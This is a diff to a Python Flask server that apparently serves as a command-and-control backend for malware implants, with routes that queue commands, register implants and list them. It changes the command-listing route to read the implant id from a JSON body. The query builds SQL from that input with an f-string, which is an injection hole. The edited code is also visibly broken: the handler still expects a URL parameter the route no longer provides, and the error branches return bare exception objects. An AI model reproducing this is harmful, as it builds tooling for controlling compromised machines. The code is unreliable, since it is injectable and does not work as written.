@@ -110,17 +110,18 @@ def handle_execute():
 # List all commands for a particular implant
 
 
-@app.route("/getCommands/<id>", methods=["POST"])
+@app.route("/get_commands", methods=["POST"])
 def get_commands(id):
-    success = None
+    data = request.json
+    id = data['id']
     try:
-        data = tools.executeSelectQuery(
+        db_resp = tools.executeSelectQuery(
             f"SELECT command FROM task_queue WHERE implant_id={id}")
-        return data, 200, {'Access-Control-Allow-Origin': config.clientURL}
+        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
-        print("failed to retrieve data")
+        print("failed to retrieve data on get_commands")
         print(error)
-        return f"Failure {error}", 401, {'Access-Control-Allow-Origin': config.clientURL} 
+        return error, {'Access-Control-Allow-Origin': config.clientURL} 
 
 # Register an implant, on the implant side
 @app.route("/register_implant", methods=["POST"])
@@ -154,7 +155,7 @@ def display_implants():
         return dbResp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as e:
         print(f"Error displaying implants: {e}")
-        return f"Error displaying results: {e}", 401, {'Access-Control-Allow-Origin': config.clientURL}
+        return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # for testing
 # def main():
